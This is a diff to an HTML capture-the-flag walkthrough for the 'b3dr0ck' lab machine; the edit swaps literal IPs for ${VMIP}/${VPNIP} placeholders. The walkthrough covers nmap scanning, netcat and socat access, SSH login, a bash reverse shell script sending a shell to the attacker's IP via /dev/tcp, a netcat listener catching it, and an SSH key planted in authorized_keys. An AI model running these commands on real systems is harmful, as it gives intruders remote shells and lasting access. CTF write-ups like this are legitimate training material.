@@ -28,9 +28,15 @@ categories:
 <h3>Steps</h3>
 <ul>
 <li>Start Machine and wait for VM ip address</li>
-<li>First test http connection to http://MACHINE_IP/ (default port 80)
+<li>Placeholders:
 <ul>
-<li>Looks like it redirects to https://MACHINE_IP:4040/</li>
+<li><strong>${VMIP}&nbsp;</strong>= IP Address of Virtual Machine (<span style="text-decoration: underline;"><em>b3dr0ck.vX)</em></span></li>
+<li><strong>${VPNIP}&nbsp;</strong>= IP Address of VPN (tun0) or AttackBox (10.10.x.x)</li>
+</ul>
+</li>
+<li>First test http connection to http://<strong>${VMIP}</strong>/ (default port 80)
+<ul>
+<li>Looks like it redirects to https://<strong>${VMIP}</strong>:4040/</li>
 <li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630285347-b3dr0ck-https.png" alt="https connection" width="368" height="278" /></li>
 <li>Accept self-signed cert and continue</li>
 <li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630512983-b3dr0ck-https-open.png" alt="" width="365" height="277" /></li>
@@ -40,20 +46,20 @@ categories:
 <li>Run nmap port scan
 <ul>
 <li>
-<pre>$ nmap -v -T4 10.10.74.126 
+<pre>$ nmap -v -T4 <strong>${VMIP}</strong> 
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-10 16:48 MDT
 Initiating Ping Scan at 16:48
-Scanning 10.10.74.126 [2 ports]
+Scanning ${VMIP} [2 ports]
 Completed Ping Scan at 16:48, 0.12s elapsed (1 total hosts)
 Initiating Parallel DNS resolution of 1 host. at 16:48
 Completed Parallel DNS resolution of 1 host. at 16:48, 0.00s elapsed
 Initiating Connect Scan at 16:48
-Scanning 10.10.74.126 [1000 ports]
-Discovered open port 22/tcp on 10.10.74.126
-Discovered open port 80/tcp on 10.10.74.126
-Discovered open port 9009/tcp on 10.10.74.126
+Scanning ${VMIP} [1000 ports]
+Discovered open port 22/tcp on ${VMIP}
+Discovered open port 80/tcp on ${VMIP}
+Discovered open port 9009/tcp on ${VMIP}
 Completed Connect Scan at 16:48, 9.02s elapsed (1000 total ports)
-Nmap scan report for 10.10.74.126
+Nmap scan report for ${VMIP}
 Host is up (0.12s latency).
 Not shown: 997 closed ports
 PORT     STATE SERVICE
@@ -70,7 +76,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds</pre>
 <li>Run&nbsp;<strong>netcat</strong> to test connecting to port&nbsp;<strong>9009</strong>
 <ul>
 <li>
-<pre>$ netcat 10.10.74.126 9009
+<pre>$ netcat ${VMIP} 9009
 
 
  __          __  _                            _                   ____   _____ 
@@ -164,8 +170,7 @@ Sounds like you forgot your private key. Let's find it for you...
 <li>The previous&nbsp;<strong>help</strong> output mentioned <strong>"socat" </strong>connect with credentials over port <strong>54321</strong>. Let's try that<br />
 <ul>
 <li>
-<pre>$ socat stdio ssl:10.10.74.126:54321,cert=client.crt,key=client.key,verify=0
-
+<pre>$ socat stdio ssl:<strong style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;">${VMIP}</strong>:54321,cert=client.crt,key=client.key,verify=0<br />
 
  __     __   _     _             _____        _     _             _____        _ 
  \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
@@ -204,12 +209,12 @@ Login is disabled. Please use SSH instead.</pre>
 <li>SSH as&nbsp;<strong>barney</strong> with password obtained above
 <ul>
 <li>
-<pre>$ ssh barney@10.10.74.126
-The authenticity of host '10.10.74.126 (10.10.74.126)' can't be established.
+<pre>$ ssh barney@${VMIP}
+The authenticity of host '${VMIP} (${VMIP})' can't be established.
 ECDSA key fingerprint is SHA256:wQ21BG+EOKJCF/4/7AIY9n8e86E7MAN2gH/J/+koWk4.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.74.126' (ECDSA) to the list of known hosts.
-barney@10.10.74.126's password: 
+Warning: Permanently added '${VMIP}' (ECDSA) to the list of known hosts.
+barney@${VMIP}'s password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -220,7 +225,7 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 
   System load:  0.0               Processes:             114
   Usage of /:   57.0% of 7.07GB   Users logged in:       0
-  Memory usage: 23%               IPv4 address for eth0: 10.10.74.126
+  Memory usage: 23%               IPv4 address for eth0: ${VMIP}
   Swap usage:   0%
 
 
@@ -300,7 +305,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 <li>
 <pre>#!/bin/bash
 
-bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.6.21.15/1234 &lt;&amp;1'</pre>
+bash -c 'exec bash -i &amp;&gt;/dev/tcp/<strong>${VPNIP}</strong>/1234 &lt;&amp;1'</pre>
 </li>
 <li>Saved as&nbsp;<strong>rev.sh</strong> (under&nbsp;<strong>/home/barney/rev.sh</strong>)</li>
 </ul>
@@ -328,7 +333,7 @@ Listening on 0.0.0.0 1234</pre>
 <li>
 <pre>$ nc -vlnp 1234                                                                                                                                                      &lt;aws:bowtie_agency&gt;
 Listening on 0.0.0.0 1234
-Connection received on 10.10.74.126 41036
+Connection received on ${VMIP} 41036
 bash: cannot set terminal process group (1410): Inappropriate ioctl for device
 bash: no job control in this shell
 fred@b3dr0ck:~$ 
@@ -353,7 +358,7 @@ echo "ssh-rsa my-ssh-public-key ..." &gt;&gt; .ssh/authorized_keys</pre>
 </li>
 <li>Let's try to SSH as&nbsp;<strong>fred</strong> now using our SSH public key authorized under his server account</li>
 <li>
-<pre>$ ssh fred@10.10.74.126                                                                                                                                              &lt;aws:bowtie_agency&gt;
+<pre>$ ssh fred@<strong>${VMIP}</strong>                                                                                                                                              &lt;aws:bowtie_agency&gt;
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -364,7 +369,7 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 
   System load:  0.0               Processes:             118
   Usage of /:   57.1% of 7.07GB   Users logged in:       1
-  Memory usage: 24%               IPv4 address for eth0: 10.10.74.126
+  Memory usage: 24%               IPv4 address for eth0: <strong>${VMIP}</strong>
   Swap usage:   0%
 
 
